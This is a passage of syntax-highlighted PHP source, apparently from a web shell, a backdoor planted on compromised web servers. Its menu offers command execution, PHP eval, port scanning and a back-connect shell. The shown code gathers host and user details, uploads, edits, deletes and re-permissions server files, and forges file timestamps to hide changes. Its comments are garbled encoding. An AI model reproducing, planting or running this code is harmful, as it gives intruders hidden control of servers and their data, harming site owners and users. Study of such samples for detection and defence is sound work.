<span class="x">function settable(tablename,doing,page) {</span>
<span class="x">    if(!tablename) return;</span>
<span class="x">    if (doing) {</span>
<span class="x">        $(&#39;settable&#39;).doing.value=doing;</span>
<span class="x">    }</span>
<span class="x">    if (page) {</span>
<span class="x">        $(&#39;settable&#39;).page.value=page;</span>
<span class="x">    }</span>
<span class="x">    $(&#39;settable&#39;).tablename.value=tablename;</span>
<span class="x">    $(&#39;settable&#39;).submit();</span>
<span class="x">}</span>
<span class="x">function s(action,nowpath,p1,p2,p3,p4,p5) {</span>
<span class="x">    if(action) $(&#39;opform&#39;).action.value=action;</span>
<span class="x">    if(nowpath) $(&#39;opform&#39;).nowpath.value=nowpath;</span>
<span class="x">    if(p1) $(&#39;opform&#39;).p1.value=p1;</span>
<span class="x">    if(p2) $(&#39;opform&#39;).p2.value=p2;</span>
<span class="x">    if(p3) $(&#39;opform&#39;).p3.value=p3;</span>
<span class="x">    if(p4) $(&#39;opform&#39;).p4.value=p4;</span>
<span class="x">    if(p5) $(&#39;opform&#39;).p4.value=p5;</span>
<span class="x">}</span>
<span class="x">function g(action,nowpath,p1,p2,p3,p4,p5) {</span>
<span class="x">    if(!action) return;</span>
<span class="x">    s(action,nowpath,p1,p2,p3,p4,p5);</span>
<span class="x">    $(&#39;opform&#39;).submit();</span>
<span class="x">}</span>
<span class="x">&amp;lt;/script&amp;gt;</span>
<span class="x">&amp;lt;/head&amp;gt;</span>
<span class="x">&amp;lt;body style=&quot;margin:0;table-layout:fixed; word-break:break-all&quot;&amp;gt;</span>
<span class="cp">&lt;?php</span>
<span class="nx">formhead</span><span class="p">(</span><span class="k">array</span><span class="p">(</span><span class="s1">&#39;name&#39;</span><span class="o">=&amp;</span><span class="nx">gt</span><span class="p">;</span><span class="s1">&#39;opform&#39;</span><span class="p">));</span>
<span class="nx">makehide</span><span class="p">(</span><span class="s1">&#39;action&#39;</span><span class="p">,</span> <span class="nv">$action</span><span class="p">);</span>
<span class="nx">makehide</span><span class="p">(</span><span class="s1">&#39;nowpath&#39;</span><span class="p">,</span> <span class="nv">$nowpath</span><span class="p">);</span>
<span class="nx">makehide</span><span class="p">(</span><span class="s1">&#39;p1&#39;</span><span class="p">,</span> <span class="nv">$p1</span><span class="p">);</span>
<span class="nx">makehide</span><span class="p">(</span><span class="s1">&#39;p2&#39;</span><span class="p">,</span> <span class="nv">$p2</span><span class="p">);</span>
<span class="nx">makehide</span><span class="p">(</span><span class="s1">&#39;p3&#39;</span><span class="p">,</span> <span class="nv">$p3</span><span class="p">);</span>
<span class="nx">makehide</span><span class="p">(</span><span class="s1">&#39;p4&#39;</span><span class="p">,</span> <span class="nv">$p4</span><span class="p">);</span>
<span class="nx">makehide</span><span class="p">(</span><span class="s1">&#39;p5&#39;</span><span class="p">,</span> <span class="nv">$p5</span><span class="p">);</span>
<span class="nx">formfoot</span><span class="p">();</span>

<span class="k">if</span><span class="p">(</span><span class="o">!</span><span class="nb">function_exists</span><span class="p">(</span><span class="s1">&#39;posix_getegid&#39;</span><span class="p">))</span> <span class="p">{</span>
    <span class="nv">$user</span> <span class="o">=</span> <span class="o">@</span><span class="nb">get_current_user</span><span class="p">();</span>
    <span class="nv">$uid</span> <span class="o">=</span> <span class="o">@</span><span class="nb">getmyuid</span><span class="p">();</span>
    <span class="nv">$gid</span> <span class="o">=</span> <span class="o">@</span><span class="nb">getmygid</span><span class="p">();</span>
    <span class="nv">$group</span> <span class="o">=</span> <span class="s2">&quot;?&quot;</span><span class="p">;</span>
<span class="p">}</span> <span class="k">else</span> <span class="p">{</span>
    <span class="nv">$uid</span> <span class="o">=</span> <span class="o">@</span><span class="nb">posix_getpwuid</span><span class="p">(</span><span class="o">@</span><span class="nb">posix_geteuid</span><span class="p">());</span>
    <span class="nv">$gid</span> <span class="o">=</span> <span class="o">@</span><span class="nb">posix_getgrgid</span><span class="p">(</span><span class="o">@</span><span class="nb">posix_getegid</span><span class="p">());</span>
    <span class="nv">$user</span> <span class="o">=</span> <span class="nv">$uid</span><span class="p">[</span><span class="s1">&#39;name&#39;</span><span class="p">];</span>
    <span class="nv">$uid</span> <span class="o">=</span> <span class="nv">$uid</span><span class="p">[</span><span class="s1">&#39;uid&#39;</span><span class="p">];</span>
    <span class="nv">$group</span> <span class="o">=</span> <span class="nv">$gid</span><span class="p">[</span><span class="s1">&#39;name&#39;</span><span class="p">];</span>
    <span class="nv">$gid</span> <span class="o">=</span> <span class="nv">$gid</span><span class="p">[</span><span class="s1">&#39;gid&#39;</span><span class="p">];</span>
<span class="p">}</span>

<span class="cp">?&gt;</span><span class="x"></span>
<span class="x">&amp;lt;table width=&quot;100%&quot; border=&quot;0&quot; cellpadding=&quot;0&quot; cellspacing=&quot;0&quot;&amp;gt;</span>
<span class="x">    &amp;lt;tr class=&quot;head&quot;&amp;gt;</span>
<span class="x">        &amp;lt;td&amp;gt;&amp;lt;span style=&quot;float:right;&quot;&amp;gt;</span><span class="cp">&lt;?php</span> <span class="k">echo</span> <span class="o">@</span><span class="nb">php_uname</span><span class="p">();</span><span class="cp">?&gt;</span><span class="x"> / User:</span><span class="cp">&lt;?php</span> <span class="k">echo</span> <span class="nv">$uid</span><span class="o">.</span><span class="s1">&#39; ( &#39;</span><span class="o">.</span><span class="nv">$user</span><span class="o">.</span><span class="s1">&#39; ) / Group: &#39;</span><span class="o">.</span><span class="nv">$gid</span><span class="o">.</span><span class="s1">&#39; ( &#39;</span><span class="o">.</span><span class="nv">$group</span><span class="o">.</span><span class="s1">&#39; )&#39;</span><span class="p">;</span><span class="cp">?&gt;</span><span class="x">&amp;lt;/span&amp;gt;</span><span class="cp">&lt;?php</span> <span class="k">echo</span> <span class="nv">$_SERVER</span><span class="p">[</span><span class="s1">&#39;HTTP_HOST&#39;</span><span class="p">];</span><span class="cp">?&gt;</span><span class="x"> (</span><span class="cp">&lt;?php</span> <span class="k">echo</span> <span class="nb">gethostbyname</span><span class="p">(</span><span class="nv">$_SERVER</span><span class="p">[</span><span class="s1">&#39;SERVER_NAME&#39;</span><span class="p">]);</span><span class="cp">?&gt;</span><span class="x">)&amp;lt;/td&amp;gt;</span>
<span class="x">    &amp;lt;/tr&amp;gt;</span>
<span class="x">    &amp;lt;tr class=&quot;alt1&quot;&amp;gt;</span>
<span class="x">        &amp;lt;td&amp;gt;</span>
<span class="x">            &amp;lt;span style=&quot;float:right;&quot;&amp;gt;PHP </span><span class="cp">&lt;?php</span> <span class="k">echo</span> <span class="k">PHP_VERSION</span><span class="p">;</span><span class="cp">?&gt;</span><span class="x"> / Safe Mode:</span><span class="cp">&lt;?php</span> <span class="k">echo</span> <span class="nx">getcfg</span><span class="p">(</span><span class="s1">&#39;safe_mode&#39;</span><span class="p">);</span><span class="cp">?&gt;</span><span class="x">&amp;lt;/span&amp;gt;</span>
<span class="x">            &amp;lt;a href=&quot;javascript:g(&#39;logout&#39;);&quot;&amp;gt;Logout&amp;lt;/a&amp;gt; | </span>
<span class="x">            &amp;lt;a href=&quot;javascript:g(&#39;file&#39;);&quot;&amp;gt;File Manager&amp;lt;/a&amp;gt; | </span>
<span class="x">            &amp;lt;a href=&quot;javascript:g(&#39;mysqladmin&#39;);&quot;&amp;gt;MYSQL Manager&amp;lt;/a&amp;gt; | </span>
<span class="x">            &amp;lt;a href=&quot;javascript:g(&#39;sqlfile&#39;);&quot;&amp;gt;MySQL Upload &amp;amp; Download&amp;lt;/a&amp;gt; | </span>
<span class="x">            &amp;lt;a href=&quot;javascript:g(&#39;shell&#39;);&quot;&amp;gt;Execute Command&amp;lt;/a&amp;gt; | </span>
<span class="x">            &amp;lt;a href=&quot;javascript:g(&#39;phpenv&#39;);&quot;&amp;gt;PHP Variable&amp;lt;/a&amp;gt; | </span>
<span class="x">            &amp;lt;a href=&quot;javascript:g(&#39;portscan&#39;);&quot;&amp;gt;Port Scan&amp;lt;/a&amp;gt; | </span>
<span class="x">            &amp;lt;a href=&quot;javascript:g(&#39;secinfo&#39;);&quot;&amp;gt;Security information&amp;lt;/a&amp;gt; | </span>
<span class="x">            &amp;lt;a href=&quot;javascript:g(&#39;eval&#39;);&quot;&amp;gt;Eval PHP Code&amp;lt;/a&amp;gt;</span>
<span class="x">            </span><span class="cp">&lt;?php</span> <span class="k">if</span> <span class="p">(</span><span class="o">!</span><span class="nx">IS_WIN</span><span class="p">)</span> <span class="p">{</span><span class="cp">?&gt;</span><span class="x"> | &amp;lt;a href=&quot;javascript:g(&#39;backconnect&#39;);&quot;&amp;gt;Back Connect&amp;lt;/a&amp;gt;</span><span class="cp">&lt;?php</span> <span class="p">}</span><span class="cp">?&gt;</span><span class="x"></span>
<span class="x">        &amp;lt;/td&amp;gt;</span>
<span class="x">    &amp;lt;/tr&amp;gt;</span>
<span class="x">&amp;lt;/table&amp;gt;</span>
<span class="x">&amp;lt;table width=&quot;100%&quot; border=&quot;0&quot; cellpadding=&quot;15&quot; cellspacing=&quot;0&quot;&amp;gt;&amp;lt;tr&amp;gt;&amp;lt;td&amp;gt;</span>
<span class="cp">&lt;?php</span>
<span class="nv">$errmsg</span> <span class="o">&amp;&amp;</span> <span class="nx">m</span><span class="p">(</span><span class="nv">$errmsg</span><span class="p">);</span>

<span class="c1">// »ñÈ¡µ±Ç°Â·¾¶</span>
<span class="k">if</span> <span class="p">(</span><span class="o">!</span><span class="nv">$dir</span><span class="p">)</span> <span class="p">{</span>
    <span class="nv">$dir</span> <span class="o">=</span> <span class="nv">$_SERVER</span><span class="p">[</span><span class="s2">&quot;DOCUMENT_ROOT&quot;</span><span class="p">]</span> <span class="o">?</span> <span class="nv">$_SERVER</span><span class="p">[</span><span class="s2">&quot;DOCUMENT_ROOT&quot;</span><span class="p">]</span> <span class="o">:</span> <span class="s1">&#39;.&#39;</span><span class="p">;</span>
<span class="p">}</span>
<span class="nv">$nowpath</span> <span class="o">=</span> <span class="nx">getPath</span><span class="p">(</span><span class="nx">SA_ROOT</span><span class="p">,</span> <span class="nv">$dir</span><span class="p">);</span>
<span class="k">if</span> <span class="p">(</span><span class="nb">substr</span><span class="p">(</span><span class="nv">$dir</span><span class="p">,</span> <span class="o">-</span><span class="mi">1</span><span class="p">)</span> <span class="o">!=</span> <span class="s1">&#39;/&#39;</span><span class="p">)</span> <span class="p">{</span>
    <span class="nv">$dir</span> <span class="o">=</span> <span class="nv">$dir</span><span class="o">.</span><span class="s1">&#39;/&#39;</span><span class="p">;</span>
<span class="p">}</span>

<span class="k">if</span> <span class="p">(</span><span class="nv">$action</span> <span class="o">==</span> <span class="s1">&#39;file&#39;</span><span class="p">)</span> <span class="p">{</span>

    <span class="c1">// ÅÐ¶Ï¶ÁÐ´Çé¿ö</span>
    <span class="nv">$dir_writeable</span> <span class="o">=</span> <span class="o">@</span><span class="nb">is_writable</span><span class="p">(</span><span class="nv">$nowpath</span><span class="p">)</span> <span class="o">?</span> <span class="s1">&#39;Writable&#39;</span> <span class="o">:</span> <span class="s1">&#39;Non-writable&#39;</span><span class="p">;</span>

    <span class="c1">// ´´½¨Ä¿Â¼</span>
    <span class="k">if</span> <span class="p">(</span><span class="nv">$newdirname</span><span class="p">)</span> <span class="p">{</span>
        <span class="nv">$mkdirs</span> <span class="o">=</span> <span class="nv">$nowpath</span><span class="o">.</span><span class="nv">$newdirname</span><span class="p">;</span>
        <span class="k">if</span> <span class="p">(</span><span class="nb">file_exists</span><span class="p">(</span><span class="nv">$mkdirs</span><span class="p">))</span> <span class="p">{</span>
            <span class="nx">m</span><span class="p">(</span><span class="s1">&#39;Directory has already existed&#39;</span><span class="p">);</span>
        <span class="p">}</span> <span class="k">else</span> <span class="p">{</span>
            <span class="nx">m</span><span class="p">(</span><span class="s1">&#39;Directory created &#39;</span><span class="o">.</span><span class="p">(</span><span class="o">@</span><span class="nb">mkdir</span><span class="p">(</span><span class="nv">$mkdirs</span><span class="p">,</span><span class="mo">0777</span><span class="p">)</span> <span class="o">?</span> <span class="s1">&#39;success&#39;</span> <span class="o">:</span> <span class="s1">&#39;failed&#39;</span><span class="p">));</span>
            <span class="o">@</span><span class="nb">chmod</span><span class="p">(</span><span class="nv">$mkdirs</span><span class="p">,</span><span class="mo">0777</span><span class="p">);</span>
        <span class="p">}</span>
    <span class="p">}</span>

    <span class="c1">// ÉÏ´«ÎÄ¼þ</span>
    <span class="k">elseif</span> <span class="p">(</span><span class="nv">$doupfile</span><span class="p">)</span> <span class="p">{</span>
        <span class="nx">m</span><span class="p">(</span><span class="s1">&#39;File upload &#39;</span><span class="o">.</span><span class="p">(</span><span class="o">@</span><span class="nb">copy</span><span class="p">(</span><span class="nv">$_FILES</span><span class="p">[</span><span class="s1">&#39;uploadfile&#39;</span><span class="p">][</span><span class="s1">&#39;tmp_name&#39;</span><span class="p">],</span><span class="nv">$uploaddir</span><span class="o">.</span><span class="s1">&#39;/&#39;</span><span class="o">.</span><span class="nv">$_FILES</span><span class="p">[</span><span class="s1">&#39;uploadfile&#39;</span><span class="p">][</span><span class="s1">&#39;name&#39;</span><span class="p">])</span> <span class="o">?</span> <span class="s1">&#39;success&#39;</span> <span class="o">:</span> <span class="s1">&#39;failed&#39;</span><span class="p">));</span>
    <span class="p">}</span>

    <span class="c1">// ±à¼­ÎÄ¼þ</span>
    <span class="k">elseif</span> <span class="p">(</span><span class="nv">$editfilename</span> <span class="o">&amp;&amp;</span> <span class="nv">$filecontent</span><span class="p">)</span> <span class="p">{</span>
        <span class="nv">$fp</span> <span class="o">=</span> <span class="o">@</span><span class="nb">fopen</span><span class="p">(</span><span class="nv">$editfilename</span><span class="p">,</span><span class="s1">&#39;w&#39;</span><span class="p">);</span>
        <span class="nx">m</span><span class="p">(</span><span class="s1">&#39;Save file &#39;</span><span class="o">.</span><span class="p">(</span><span class="o">@</span><span class="nb">fwrite</span><span class="p">(</span><span class="nv">$fp</span><span class="p">,</span><span class="nv">$filecontent</span><span class="p">)</span> <span class="o">?</span> <span class="s1">&#39;success&#39;</span> <span class="o">:</span> <span class="s1">&#39;failed&#39;</span><span class="p">));</span>
        <span class="o">@</span><span class="nb">fclose</span><span class="p">(</span><span class="nv">$fp</span><span class="p">);</span>
    <span class="p">}</span>

    <span class="c1">// ±à¼­ÎÄ¼þÊôÐÔ</span>
    <span class="k">elseif</span> <span class="p">(</span><span class="nv">$pfile</span> <span class="o">&amp;&amp;</span> <span class="nv">$newperm</span><span class="p">)</span> <span class="p">{</span>
        <span class="k">if</span> <span class="p">(</span><span class="o">!</span><span class="nb">file_exists</span><span class="p">(</span><span class="nv">$pfile</span><span class="p">))</span> <span class="p">{</span>
            <span class="nx">m</span><span class="p">(</span><span class="s1">&#39;The original file does not exist&#39;</span><span class="p">);</span>
        <span class="p">}</span> <span class="k">else</span> <span class="p">{</span>
            <span class="nv">$newperm</span> <span class="o">=</span> <span class="nb">base_convert</span><span class="p">(</span><span class="nv">$newperm</span><span class="p">,</span><span class="mi">8</span><span class="p">,</span><span class="mi">10</span><span class="p">);</span>
            <span class="nx">m</span><span class="p">(</span><span class="s1">&#39;Modify file attributes &#39;</span><span class="o">.</span><span class="p">(</span><span class="o">@</span><span class="nb">chmod</span><span class="p">(</span><span class="nv">$pfile</span><span class="p">,</span><span class="nv">$newperm</span><span class="p">)</span> <span class="o">?</span> <span class="s1">&#39;success&#39;</span> <span class="o">:</span> <span class="s1">&#39;failed&#39;</span><span class="p">));</span>
        <span class="p">}</span>
    <span class="p">}</span>

    <span class="c1">// ¸ÄÃû</span>
    <span class="k">elseif</span> <span class="p">(</span><span class="nv">$oldname</span> <span class="o">&amp;&amp;</span> <span class="nv">$newfilename</span><span class="p">)</span> <span class="p">{</span>
        <span class="nv">$nname</span> <span class="o">=</span> <span class="nv">$nowpath</span><span class="o">.</span><span class="nv">$newfilename</span><span class="p">;</span>
        <span class="k">if</span> <span class="p">(</span><span class="nb">file_exists</span><span class="p">(</span><span class="nv">$nname</span><span class="p">)</span> <span class="o">||</span> <span class="o">!</span><span class="nb">file_exists</span><span class="p">(</span><span class="nv">$oldname</span><span class="p">))</span> <span class="p">{</span>
            <span class="nx">m</span><span class="p">(</span><span class="nv">$nname</span><span class="o">.</span><span class="s1">&#39; has already existed or original file does not exist&#39;</span><span class="p">);</span>
        <span class="p">}</span> <span class="k">else</span> <span class="p">{</span>
            <span class="nx">m</span><span class="p">(</span><span class="nb">basename</span><span class="p">(</span><span class="nv">$oldname</span><span class="p">)</span><span class="o">.</span><span class="s1">&#39; renamed &#39;</span><span class="o">.</span><span class="nb">basename</span><span class="p">(</span><span class="nv">$nname</span><span class="p">)</span><span class="o">.</span><span class="p">(</span><span class="o">@</span><span class="nb">rename</span><span class="p">(</span><span class="nv">$oldname</span><span class="p">,</span><span class="nv">$nname</span><span class="p">)</span> <span class="o">?</span> <span class="s1">&#39; success&#39;</span> <span class="o">:</span> <span class="s1">&#39;failed&#39;</span><span class="p">));</span>
        <span class="p">}</span>
    <span class="p">}</span>

    <span class="c1">// ¸´ÖÆÎÄ¼þ</span>
    <span class="k">elseif</span> <span class="p">(</span><span class="nv">$sname</span> <span class="o">&amp;&amp;</span> <span class="nv">$tofile</span><span class="p">)</span> <span class="p">{</span>
        <span class="k">if</span> <span class="p">(</span><span class="nb">file_exists</span><span class="p">(</span><span class="nv">$tofile</span><span class="p">)</span> <span class="o">||</span> <span class="o">!</span><span class="nb">file_exists</span><span class="p">(</span><span class="nv">$sname</span><span class="p">))</span> <span class="p">{</span>
            <span class="nx">m</span><span class="p">(</span><span class="s1">&#39;The goal file has already existed or original file does not exist&#39;</span><span class="p">);</span>
        <span class="p">}</span> <span class="k">else</span> <span class="p">{</span>
            <span class="nx">m</span><span class="p">(</span><span class="nb">basename</span><span class="p">(</span><span class="nv">$tofile</span><span class="p">)</span><span class="o">.</span><span class="s1">&#39; copied &#39;</span><span class="o">.</span><span class="p">(</span><span class="o">@</span><span class="nb">copy</span><span class="p">(</span><span class="nv">$sname</span><span class="p">,</span><span class="nv">$tofile</span><span class="p">)</span> <span class="o">?</span> <span class="nb">basename</span><span class="p">(</span><span class="nv">$tofile</span><span class="p">)</span><span class="o">.</span><span class="s1">&#39; success&#39;</span> <span class="o">:</span> <span class="s1">&#39;failed&#39;</span><span class="p">));</span>
        <span class="p">}</span>
    <span class="p">}</span>

    <span class="c1">// ¿ËÂ¡Ê±¼ä</span>
    <span class="k">elseif</span> <span class="p">(</span><span class="nv">$curfile</span> <span class="o">&amp;&amp;</span> <span class="nv">$tarfile</span><span class="p">)</span> <span class="p">{</span>
        <span class="k">if</span> <span class="p">(</span><span class="o">!@</span><span class="nb">file_exists</span><span class="p">(</span><span class="nv">$curfile</span><span class="p">)</span> <span class="o">||</span> <span class="o">!@</span><span class="nb">file_exists</span><span class="p">(</span><span class="nv">$tarfile</span><span class="p">))</span> <span class="p">{</span>
            <span class="nx">m</span><span class="p">(</span><span class="s1">&#39;The goal file has already existed or original file does not exist&#39;</span><span class="p">);</span>
        <span class="p">}</span> <span class="k">else</span> <span class="p">{</span>
            <span class="nv">$time</span> <span class="o">=</span> <span class="o">@</span><span class="nb">filemtime</span><span class="p">(</span><span class="nv">$tarfile</span><span class="p">);</span>
            <span class="nx">m</span><span class="p">(</span><span class="s1">&#39;Modify file the last modified &#39;</span><span class="o">.</span><span class="p">(</span><span class="o">@</span><span class="nb">touch</span><span class="p">(</span><span class="nv">$curfile</span><span class="p">,</span><span class="nv">$time</span><span class="p">,</span><span class="nv">$time</span><span class="p">)</span> <span class="o">?</span> <span class="s1">&#39;success&#39;</span> <span class="o">:</span> <span class="s1">&#39;failed&#39;</span><span class="p">));</span>
        <span class="p">}</span>
    <span class="p">}</span>

    <span class="c1">// ×Ô¶¨ÒåÊ±¼ä</span>
    <span class="k">elseif</span> <span class="p">(</span><span class="nv">$curfile</span> <span class="o">&amp;&amp;</span> <span class="nv">$year</span> <span class="o">&amp;&amp;</span> <span class="nv">$month</span> <span class="o">&amp;&amp;</span> <span class="nv">$day</span> <span class="o">&amp;&amp;</span> <span class="nv">$hour</span> <span class="o">&amp;&amp;</span> <span class="nv">$minute</span> <span class="o">&amp;&amp;</span> <span class="nv">$second</span><span class="p">)</span> <span class="p">{</span>
        <span class="k">if</span> <span class="p">(</span><span class="o">!@</span><span class="nb">file_exists</span><span class="p">(</span><span class="nv">$curfile</span><span class="p">))</span> <span class="p">{</span>
            <span class="nx">m</span><span class="p">(</span><span class="nb">basename</span><span class="p">(</span><span class="nv">$curfile</span><span class="p">)</span><span class="o">.</span><span class="s1">&#39; does not exist&#39;</span><span class="p">);</span>
        <span class="p">}</span> <span class="k">else</span> <span class="p">{</span>
            <span class="nv">$time</span> <span class="o">=</span> <span class="nb">strtotime</span><span class="p">(</span><span class="s2">&quot;</span><span class="si">$year</span><span class="s2">-</span><span class="si">$month</span><span class="s2">-</span><span class="si">$day</span><span class="s2"> </span><span class="si">$hour</span><span class="s2">:</span><span class="si">$minute</span><span class="s2">:</span><span class="si">$second</span><span class="s2">&quot;</span><span class="p">);</span>
            <span class="nx">m</span><span class="p">(</span><span class="s1">&#39;Modify file the last modified &#39;</span><span class="o">.</span><span class="p">(</span><span class="o">@</span><span class="nb">touch</span><span class="p">(</span><span class="nv">$curfile</span><span class="p">,</span><span class="nv">$time</span><span class="p">,</span><span class="nv">$time</span><span class="p">)</span> <span class="o">?</span> <span class="s1">&#39;success&#39;</span> <span class="o">:</span> <span class="s1">&#39;failed&#39;</span><span class="p">));</span>
        <span class="p">}</span>
    <span class="p">}</span>

    <span class="c1">// ÅúÁ¿É¾³ýÎÄ¼þ</span>
    <span class="k">elseif</span><span class="p">(</span><span class="nv">$doing</span> <span class="o">==</span> <span class="s1">&#39;delfiles&#39;</span><span class="p">)</span> <span class="p">{</span>
        <span class="k">if</span> <span class="p">(</span><span class="nv">$dl</span><span class="p">)</span> <span class="p">{</span>
            <span class="nv">$dfiles</span><span class="o">=</span><span class="s1">&#39;&#39;</span><span class="p">;</span>
            <span class="nv">$succ</span> <span class="o">=</span> <span class="nv">$fail</span> <span class="o">=</span> <span class="mi">0</span><span class="p">;</span>
            <span class="k">foreach</span> <span class="p">(</span><span class="nv">$dl</span> <span class="k">as</span> <span class="nv">$filepath</span><span class="p">)</span> <span class="p">{</span>
                <span class="k">if</span> <span class="p">(</span><span class="nb">is_dir</span><span class="p">(</span><span class="nv">$filepath</span><span class="p">))</span> <span class="p">{</span>
                    <span class="k">if</span> <span class="p">(</span><span class="o">@</span><span class="nx">deltree</span><span class="p">(</span><span class="nv">$filepath</span><span class="p">))</span> <span class="p">{</span>
                        <span class="nv">$succ</span><span class="o">++</span><span class="p">;</span>
                    <span class="p">}</span> <span class="k">else</span> <span class="p">{</span>
                        <span class="nv">$fail</span><span class="o">++</span><span class="p">;</span>
                    <span class="p">}</span>
                <span class="p">}</span> <span class="k">else</span> <span class="p">{</span>
                    <span class="k">if</span> <span class="p">(</span><span class="o">@</span><span class="nb">unlink</span><span class="p">(</span><span class="nv">$filepath</span><span class="p">))</span> <span class="p">{</span>
                        <span class="nv">$succ</span><span class="o">++</span><span class="p">;</span>
                    <span class="p">}</span> <span class="k">else</span> <span class="p">{</span>
                        <span class="nv">$fail</span><span class="o">++</span><span class="p">;</span>
                    <span class="p">}</span>
                <span class="p">}</span>
            <span class="p">}</span>
            <span class="nx">m</span><span class="p">(</span><span class="s1">&#39;Deleted folder/file have finished,choose &#39;</span><span class="o">.</span><span class="nb">count</span><span class="p">(</span><span class="nv">$dl</span><span class="p">)</span><span class="o">.</span><span class="s1">&#39; success &#39;</span><span class="o">.</span><span class="nv">$succ</span><span class="o">.</span><span class="s1">&#39; fail &#39;</span><span class="o">.</span><span class="nv">$fail</span><span class="p">);</span>
        <span class="p">}</span> <span class="k">else</span> <span class="p">{</span>
            <span class="nx">m</span><span class="p">(</span><span class="s1">&#39;Please select folder/file(s)&#39;</span><span class="p">);</span>
        <span class="p">}</span>
    <span class="p">}</span>

    <span class="c1">//²Ù×÷Íê±Ï</span>
    <span class="nx">formhead</span><span class="p">(</span><span class="k">array</span><span class="p">(</span><span class="s1">&#39;name&#39;</span><span class="o">=&amp;</span><span class="nx">gt</span><span class="p">;</span><span class="s1">&#39;createdir&#39;</span><span class="p">));</span>
    <span class="nx">makehide</span><span class="p">(</span><span class="s1">&#39;newdirname&#39;</span><span class="p">);</span>
    <span class="nx">makehide</span><span class="p">(</span><span class="s1">&#39;dir&#39;</span><span class="p">,</span><span class="nv">$nowpath</span><span class="p">);</span>
    <span class="nx">formfoot</span><span class="p">();</span>
    <span class="nx">formhead</span><span class="p">(</span><span class="k">array</span><span class="p">(</span><span class="s1">&#39;name&#39;</span><span class="o">=&amp;</span><span class="nx">gt</span><span class="p">;</span><span class="s1">&#39;fileperm&#39;</span><span class="p">));</span>
    <span class="nx">makehide</span><span class="p">(</span><span class="s1">&#39;newperm&#39;</span><span class="p">);</span>
    <span class="nx">makehide</span><span class="p">(</span><span class="s1">&#39;pfile&#39;</span><span class="p">);</span>
    <span class="nx">makehide</span><span class="p">(</span><span class="s1">&#39;dir&#39;</span><span class="p">,</span><span class="nv">$nowpath</span><span class="p">);</span>
    <span class="nx">formfoot</span><span class="p">();</span>
    <span class="nx">formhead</span><span class="p">(</span><span class="k">array</span><span class="p">(</span><span class="s1">&#39;name&#39;</span><span class="o">=&amp;</span><span class="nx">gt</span><span class="p">;</span><span class="s1">&#39;copyfile&#39;</span><span class="p">));</span>
    <span class="nx">makehide</span><span class="p">(</span><span class="s1">&#39;sname&#39;</span><span class="p">);</span>
    <span class="nx">makehide</span><span class="p">(</span><span class="s1">&#39;tofile&#39;</span><span class="p">);</span>
    <span class="nx">makehide</span><span class="p">(</span><span class="s1">&#39;dir&#39;</span><span class="p">,</span><span class="nv">$nowpath</span><span class="p">);</span>
    <span class="nx">formfoot</span><span class="p">();</span>
    <span class="nx">formhead</span><span class="p">(</span><span class="k">array</span><span class="p">(</span><span class="s1">&#39;name&#39;</span><span class="o">=&amp;</span><span class="nx">gt</span><span class="p">;</span><span class="s1">&#39;rename&#39;</span><span class="p">));</span>
    <span class="nx">makehide</span><span class="p">(</span><span class="s1">&#39;oldname&#39;</span><span class="p">);</span>
    <span class="nx">makehide</span><span class="p">(</span><span class="s1">&#39;newfilename&#39;</span><span class="p">);</span>
    <span class="nx">makehide</span><span class="p">(</span><span class="s1">&#39;dir&#39;</span><span class="p">,</span><span class="nv">$nowpath</span><span class="p">);</span>
    <span class="nx">formfoot</span><span class="p">();</span>
    <span class="nx">formhead</span><span class="p">(</span><span class="k">array</span><span class="p">(</span><span class="s1">&#39;name&#39;</span><span class="o">=&amp;</span><span class="nx">gt</span><span class="p">;</span><span class="s1">&#39;fileopform&#39;</span><span class="p">,</span> <span class="s1">&#39;target&#39;</span><span class="o">=&amp;</span><span class="nx">gt</span><span class="p">;</span><span class="s1">&#39;_blank&#39;</span><span class="p">));</span>
    <span class="nx">makehide</span><span class="p">(</span><span class="s1">&#39;action&#39;</span><span class="p">);</span>
    <span class="nx">makehide</span><span class="p">(</span><span class="s1">&#39;opfile&#39;</span><span class="p">);</span>
    <span class="nx">makehide</span><span class="p">(</span><span class="s1">&#39;dir&#39;</span><span class="p">);</span>
    <span class="nx">formfoot</span><span class="p">();</span>
    <span class="nx">formhead</span><span class="p">(</span><span class="k">array</span><span class="p">(</span><span class="s1">&#39;name&#39;</span><span class="o">=&amp;</span><span class="nx">gt</span><span class="p">;</span><span class="s1">&#39;getsize&#39;</span><span class="p">));</span>
    <span class="nx">makehide</span><span class="p">(</span><span class="s1">&#39;getdir&#39;</span><span class="p">);</span>
    <span class="nx">makehide</span><span class="p">(</span><span class="s1">&#39;dir&#39;</span><span class="p">);</span>
    <span class="nx">formfoot</span><span class="p">();</span>

    <span class="nv">$free</span> <span class="o">=</span> <span class="o">@</span><span class="nb">disk_free_space</span><span class="p">(</span><span class="nv">$nowpath</span><span class="p">);</span>
    <span class="o">!</span><span class="nv">$free</span> <span class="o">&amp;&amp;</span> <span class="nv">$free</span> <span class="o">=</span> <span class="mi">0</span><span class="p">;</span>
    <span class="nv">$all</span> <span class="o">=</span> <span class="o">@</span><span class="nb">disk_total_space</span><span class="p">(</span><span class="nv">$nowpath</span><span class="p">);</span>
    <span class="o">!</span><span class="nv">$all</span> <span class="o">&amp;&amp;</span> <span class="nv">$all</span> <span class="o">=</span> <span class="mi">0</span><span class="p">;</span>
    <span class="nv">$used</span> <span class="o">=</span> <span class="nv">$all</span><span class="o">-</span><span class="nv">$free</span><span class="p">;</span>
    <span class="nx">p</span><span class="p">(</span><span class="s1">&#39;&amp;lt;h2&amp;gt;File Manager - Current disk free &#39;</span><span class="o">.</span><span class="nx">sizecount</span><span class="p">(</span><span class="nv">$free</span><span class="p">)</span><span class="o">.</span><span class="s1">&#39; of &#39;</span><span class="o">.</span><span class="nx">sizecount</span><span class="p">(</span><span class="nv">$all</span><span class="p">)</span><span class="o">.</span><span class="s1">&#39; (&#39;</span><span class="o">.@</span><span class="nb">round</span><span class="p">(</span><span class="mi">100</span><span class="o">/</span><span class="p">(</span><span class="nv">$all</span><span class="o">/</span><span class="nv">$free</span><span class="p">),</span><span class="mi">2</span><span class="p">)</span><span class="o">.</span><span class="s1">&#39;%)&amp;lt;/h2&amp;gt;&#39;</span><span class="p">);</span>

    <span class="nv">$cwd_links</span> <span class="o">=</span> <span class="s1">&#39;&#39;</span><span class="p">;</span>
    <span class="nv">$path</span> <span class="o">=</span> <span class="nb">explode</span><span class="p">(</span><span class="s1">&#39;/&#39;</span><span class="p">,</span> <span class="nv">$nowpath</span><span class="p">);</span>
    <span class="nv">$n</span><span class="o">=</span><span class="nb">count</span><span class="p">(</span><span class="nv">$path</span><span class="p">);</span>
